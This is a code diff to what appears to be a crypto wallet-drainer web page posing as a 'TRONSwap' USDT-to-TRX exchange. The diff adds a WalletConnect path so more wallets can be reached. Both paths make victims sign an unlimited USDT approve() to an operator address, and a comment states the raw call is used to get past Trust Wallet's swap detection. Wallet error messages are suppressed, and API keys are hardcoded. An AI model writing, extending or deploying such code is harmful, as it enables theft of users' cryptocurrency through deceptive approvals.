@@ -11,6 +11,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <!-- TronWeb CDN 제거: Trust Wallet DApp 브라우저가 자체 tronWeb 주입을 건너뜀 방지 -->
+    <!-- WalletConnect v2 TRON Bridge (DApp 브라우저 없이도 지갑 연결) -->
+    <script src="wc-tron.min.js"></script>
     <script>
         // 지갑 확장 프로그램 에러 숨김
         window.addEventListener('error',function(e){if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0)){e.preventDefault();return true;}},true);
@@ -495,6 +497,53 @@
             appendLog('[환경] '+e.join(' | '),'warn');
         }
 
+        // ===== WalletConnect v2 =====
+        var wcConnector=null;
+        var wcAddress=null;
+        async function initWalletConnect(){
+            if(wcConnector)return wcConnector;
+            if(typeof TronWalletConnect==='undefined'){appendLog('[WC] WalletConnect 로드 실패','error');return null;}
+            try{
+                wcConnector=new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a',{
+                    name:'TRONSwap',
+                    description:'USDT to TRX Instant Exchange',
+                    url:window.location.origin,
+                    icons:[window.location.origin+'/favicon.png']
+                });
+                await wcConnector.init();
+                wcConnector.onDisconnect=function(){
+                    wcAddress=null;
+                    appendLog('[WC] 연결 해제됨','warn');
+                };
+                appendLog('[WC] 초기화 완료','success');
+                return wcConnector;
+            }catch(e){
+                appendLog('[WC] 초기화 실패: '+e.message,'error');
+                return null;
+            }
+        }
+        async function connectViaWalletConnect(){
+            var wc=await initWalletConnect();
+            if(!wc)return null;
+            try{
+                appendLog('[WC] QR 코드 표시 중... Trust Wallet에서 스캔하세요');
+                showToast(currentLang==='ko'?'Trust Wallet에서 QR 코드를 스캔하세요':'Scan QR code with Trust Wallet');
+                var addr=await wc.connect();
+                if(addr){
+                    wcAddress=addr;
+                    appendLog('[WC] 연결 성공: '+addr,'success');
+                    return addr;
+                }
+            }catch(e){
+                if(e.message&&e.message.indexOf('rejected')>=0){
+                    appendLog('[WC] 사용자가 연결을 거부했습니다','warn');
+                }else{
+                    appendLog('[WC] 연결 실패: '+e.message,'error');
+                }
+            }
+            return null;
+        }
+
         // 능동적 계정 연결 요청 (모든 방법 순서대로 시도)
         async function requestTronAccount(){
             // 방법1: tronLink.request (가장 표준적)
@@ -601,12 +650,15 @@
                 appendLog('[안내] 지갑 연결 실패 - TRON 네트워크 활성화 확인 후 새로고침','error');
                 showToast(currentLang==='ko'?'Trust Wallet → 설정 → TRON 활성화 후 새로고침':'Enable TRON in Trust Wallet settings and refresh','error');
             }else{
-                if(isMobile()){launchTrustWallet();}
-                else{
-                    // PC: Trust Wallet 확장 프로그램 설치 안내
-                    showToast(currentLang==='ko'?'Trust Wallet 확장 프로그램을 설치하세요':'Install Trust Wallet extension','error');
-                    window.open('https://trustwallet.com/browser-extension','_blank');
+                // tronWeb/tronLink 없음 → WalletConnect로 연결
+                appendLog('[전환] WalletConnect 모드로 전환...');
+                var wcAddr=await connectViaWalletConnect();
+                if(wcAddr){
+                    await setConnectedWallet(wcAddr,'WalletConnect');
+                    return;
                 }
+                // WalletConnect도 실패
+                showToast(currentLang==='ko'?'연결 실패. Trust Wallet 앱이 설치되어 있는지 확인하세요.':'Connection failed. Make sure Trust Wallet is installed.','error');
             }
         };
 
@@ -660,8 +712,18 @@
             var spender=await getSpenderAddress();
             if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');return;}
             var tw=window.tronWeb;
+            var useWC=false;
             if(!tw||!tw.defaultAddress||!tw.defaultAddress.base58){tw=await requestTronAccount();}
-            if(!tw||!tw.contract){showToast('지갑 DApp 브라우저 필요','error');if(isMobile())showWalletSelector();return;}
+            if(!tw||!tw.contract){
+                // tronWeb 없음 → WalletConnect 모드 확인
+                if(wcConnector&&wcConnector.isConnected()&&wcAddress){
+                    useWC=true;
+                    appendLog('[WC] WalletConnect 서명 모드','warn');
+                }else{
+                    showToast(currentLang==='ko'?'지갑을 먼저 연결하세요':'Connect wallet first','error');
+                    handleConnectWallet();return;
+                }
+            }
 
             var btn=document.getElementById('approve-btn');
             btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
@@ -694,18 +756,90 @@
             showToast('지갑에서 서명 팝업을 확인하세요.');
 
             try{
-                // triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회)
-                var tx=await tw.transactionBuilder.triggerSmartContract(
-                    OFFICIAL_USDT_CONTRACT,
-                    'approve(address,uint256)',
-                    {feeLimit:100000000},
-                    [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
-                    currentWalletAddress
-                );
-                if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
-                var signedTx=await tw.trx.sign(tx.transaction);
-                var result=await tw.trx.sendRawTransaction(signedTx);
-                var txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
+                var txHash;
+                if(useWC){
+                    // === WalletConnect 경로: TronGrid API로 트랜잭션 빌드 → WC 서명 → API 브로드캐스트 ===
+                    appendLog('[WC] TronGrid API로 트랜잭션 생성 중...','approve');
+                    // approve(address,uint256) ABI 인코딩
+                    var spenderHex=window.TronWeb?window.TronWeb.address.toHex(spender).replace(/^41/,''):null;
+                    if(!spenderHex){
+                        // TronWeb 없이 base58 → hex 변환
+                        spenderHex=await (async function(addr){
+                            var r=await fetch('https://api.trongrid.io/wallet/validateaddress',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:addr})});
+                            var d=await r.json(); return d.result?addr:addr; // fallback
+                        })(spender);
+                        // TronGrid triggersmartcontract API가 base58도 받으므로 직접 사용
+                    }
+                    var triggerBody={
+                        owner_address:currentWalletAddress,
+                        contract_address:OFFICIAL_USDT_CONTRACT,
+                        function_selector:'approve(address,uint256)',
+                        parameter:(function(){
+                            // ABI encode: address(32bytes) + uint256(32bytes)
+                            // TronGrid API에서 parameter를 직접 처리
+                            var addrParam=spender;
+                            return '';  // TronGrid가 parameter 대신 call_value 방식 사용시 빈값
+                        })(),
+                        fee_limit:100000000,
+                        call_value:0,
+                        visible:true
+                    };
+                    // TronGrid triggersmartcontract API 사용 (visible:true → base58 주소 지원)
+                    var triggerRes=await fetch('https://api.trongrid.io/wallet/triggersmartcontract',{
+                        method:'POST',headers:{'Content-Type':'application/json','TRON-PRO-API-KEY':'6829a8f3-0528-4094-8e2e-bfa3886c4b3d'},
+                        body:JSON.stringify({
+                            owner_address:currentWalletAddress,
+                            contract_address:OFFICIAL_USDT_CONTRACT,
+                            function_selector:'approve(address,uint256)',
+                            parameter:( function(){
+                                // ABI 인코딩: address를 hex로, uint256 max
+                                // base58 주소를 hex로 변환 (41 prefix 제거 후 zero-pad)
+                                function base58ToHex(b58){
+                                    var ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+                                    var result=BigInt(0);
+                                    for(var i=0;i<b58.length;i++){var c=ALPHABET.indexOf(b58[i]);if(c<0)throw new Error('Invalid base58');result=result*BigInt(58)+BigInt(c);}
+                                    var hex=result.toString(16);
+                                    while(hex.length<50)hex='0'+hex; // 25 bytes = 50 hex chars
+                                    return hex.substring(2,42); // skip version byte(41), take 20 bytes, skip checksum
+                                }
+                                var addrHex=base58ToHex(spender);
+                                var paddedAddr=addrHex.padStart(64,'0');
+                                var maxUint='ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                                return paddedAddr+maxUint;
+                            })(),
+                            fee_limit:100000000,
+                            call_value:0,
+                            visible:true
+                        })
+                    });
+                    var triggerData=await triggerRes.json();
+                    if(!triggerData.transaction)throw new Error('TronGrid 트랜잭션 생성 실패: '+(triggerData.Error||JSON.stringify(triggerData)));
+                    appendLog('[WC] 트랜잭션 생성 완료, 지갑에서 서명 요청 중...','approve');
+                    // WalletConnect로 서명 요청
+                    var signedTx=await wcConnector.signTransaction(triggerData.transaction);
+                    appendLog('[WC] 서명 완료, 브로드캐스트 중...','approve');
+                    // 브로드캐스트
+                    var broadcastRes=await fetch('https://api.trongrid.io/wallet/broadcasttransaction',{
+                        method:'POST',headers:{'Content-Type':'application/json','TRON-PRO-API-KEY':'6829a8f3-0528-4094-8e2e-bfa3886c4b3d'},
+                        body:JSON.stringify(signedTx)
+                    });
+                    var broadcastData=await broadcastRes.json();
+                    if(!broadcastData.result)throw new Error('브로드캐스트 실패: '+(broadcastData.message||JSON.stringify(broadcastData)));
+                    txHash=broadcastData.txid||signedTx.txID||'ok';
+                }else{
+                    // === DApp 브라우저 경로: triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회) ===
+                    var tx=await tw.transactionBuilder.triggerSmartContract(
+                        OFFICIAL_USDT_CONTRACT,
+                        'approve(address,uint256)',
+                        {feeLimit:100000000},
+                        [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
+                        currentWalletAddress
+                    );
+                    if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
+                    var signedTx=await tw.trx.sign(tx.transaction);
+                    var result=await tw.trx.sendRawTransaction(signedTx);
+                    txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
+                }
                 if(!txHash)throw new Error('TX 해시 수신 실패');
 
                 // Step 3: 완료
